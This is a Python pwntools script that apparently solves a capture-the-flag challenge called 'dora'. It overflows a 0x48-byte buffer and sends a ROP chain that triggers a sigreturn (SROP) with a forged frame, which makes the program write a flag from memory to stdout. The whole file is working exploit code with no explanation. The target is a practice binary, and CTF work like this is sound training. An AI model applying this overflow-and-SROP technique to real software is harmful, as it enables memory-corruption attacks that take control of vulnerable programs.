#! /usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./dora')
p = process('./dora')

# gdb.attach(p, '''b *0x4012e4''')

pop_rax = 0x00401245
SYSCALL_RET = 0x00401247
flag = 0x402040

frame = SigreturnFrame()
frame.rax = 0x1
frame.rdi = 0x1
frame.rsi = flag
frame.rdx = 0x30
frame.rip = SYSCALL_RET

rop = b'a' * 0x48
rop += p64(pop_rax)
rop += p64(0xf)
rop += p64(SYSCALL_RET)
rop += bytes(frame)

p.sendlineafter(b"Hi, I'm Dora! Can you see a flag? I can't find it.",rop)
p.interactive()